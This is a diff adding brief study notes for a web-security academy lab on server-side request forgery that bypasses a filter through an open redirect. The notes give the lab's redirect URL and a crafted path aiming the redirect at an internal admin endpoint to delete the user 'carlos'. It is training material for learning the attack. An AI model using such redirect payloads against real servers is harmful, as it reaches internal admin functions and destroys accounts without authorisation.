@@ -1,0 +1,7 @@
+Lab #05: SSRF with filter bypass via open redirection vulnerability
+
+Click on next product and see the path 
+https://0afa00da036d7ca98355ce3400f7005e.web-security-academy.net/product/nextProduct?currentProductId=7&path=/product?productId=8
+
+create url based on this redirection
+/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
